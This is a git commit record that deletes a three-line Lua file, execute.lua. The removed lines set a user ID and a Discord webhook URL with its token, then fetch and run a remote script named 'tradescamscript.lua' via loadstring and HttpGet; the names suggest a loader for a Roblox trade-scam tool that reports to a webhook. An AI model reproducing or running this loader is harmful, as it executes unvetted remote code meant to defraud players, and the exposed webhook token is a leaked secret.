db77804d2ec3fb1c78f54e464073941b670a745c
kezulox <65214003+kezulox@users.noreply.github.com>
2022-12-11 00:37:19 -0600

    Delete execute.lua

--- execute.lua
+++
@@ -1,3 +0,0 @@
-_G.UserID = 4128543389
-_G.WebHook = "https://canary.discord.com/api/webhooks/1051348058115420210/XEk-iAay5Ky_ci4pmBrkbWZKtToE85L2uDVjdZ50pj7FsNu85SEtI7spPZDk74NWgGcN"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/kezulox/scripts/main/tradescamscript.lua'))()
